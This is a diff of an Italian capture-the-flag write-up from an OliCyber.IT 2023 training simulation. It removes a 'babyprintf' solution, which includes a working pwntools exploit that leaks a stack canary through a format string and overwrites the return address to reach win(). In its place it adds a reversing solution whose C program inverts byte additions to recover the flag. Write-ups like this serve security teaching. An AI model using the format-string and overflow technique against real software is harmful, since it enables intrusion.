@@ -1,62 +1,30 @@
 # OliCyber.IT 2023 - Simulazione training camp 2
 
-## [binary] babyprintf (21 risoluzioni)
+## [binary] strong-as-md5 (21 risoluzioni)
 
-La challenge fa echo di ogni stringa inserita. Le vulnerabilità nel programma sono un buffer overrun, dato che il numero di byte letti è maggiore della dimensione del buffer (300 vs 32), e una printf con formattatore definito dall'utente.
+La challenge controlla se la stringa inserita corrisponda alla flag, attraverso delle operazioni eseguite sull'input.
 
-Il programma contiene una win function che bisogna arrivare a chiamare.
+In particolare aggiunge ad ognun carattere dell'input inserito 4 valori, diversi per ogni char, definiti in una costante globale, e poi controlla che l'output finale corrisponda ad un target, sempre definito globalmente.
 
 ### Soluzione
 
-Usando la printf si possono leakare dallo stack il canary del programma e un indirizzo a main. Con un offset dall'indirizzo di main ottenuto si arriva all'indirizzo della funzione `win()`, che stampa la flag.
-
-Una volta ottenuti i valori necessari basta sovrascrivere il canary e l'indirizzo di ritorno con il buffer overrun, e poi triggerare l'uscita da main scrivendo `!q`
+Dato che ogni operazione su ogni singolo carattere è fissa, basta invertirla per ottenere la flag originale dal target definito nel programma.
 
 ### Exploit
 
-```python
-#!/bin/python3
+```c
+#include <stdio.h>
+#include <stdlib.h>
 
-import os
-from pwn import *
-import logging
-logging.disable()
+char table[64] = "\xad\xf7\xb1\x83`S\xb7^D\x91UK\xbc\xfb\x85[?\xecU\xd5!\xe3\xb1\xa9\x15\xc9\x90H\xc2%.0\x06\xb3\xa6\xe4\xf5\xac~\x12\xadk\xc2\x82\xbf\r\xda8a*\x0fz\xdd\x8f\x9a\xaeh\x14\xa4\xa6\xd5\xd7 \x96";
+char input[16] = "\x67\x7c\xea\x32\x8b\xc0\xc6\x9f\xda\xd7\xe8\x1c\xd3\xf6\xaf\xb5";
 
-HOST = os.environ.get("HOST", "xxx.challs.olicyber.it")
-PORT = int(os.environ.get("PORT", 34001))
-
-io = remote(HOST, PORT)
-
-mem = [b""] * 100
-
-io.recvuntil(b"back:")
-for i in range(100):
-    io.sendline(f"%{i}$p")
-    mem[i] = io.recvline()
-
-cs = mem[12]
-canary = eval(cs)
-
-ms = mem[16]
-main = eval(ms)
-win = main - 54
-
-log.success(f"canary: {hex(canary)}")
-log.success(f"main: {hex(main)}")
-log.success(f"win: {hex(win)}")
-
-io.sendline(fit({
-    32: p64(canary)*2 + p64(win) * 3
-}))
-
-io.sendline(b"!q")
-
-f = io.recvline()
-f += io.recvline(timeout=0.1)
-f += io.recvline(timeout=0.1)
-
-assert "flag" in f
-
-print(f)
-
+int main() {
+  for (int i = 0; i < 4; i++) {
+    for (int j = 0; j < 16; j++) {
+      input[j] = input[j] - table[i * 16 + j];
+    }
+  }
+  puts(input);
+}
 ```
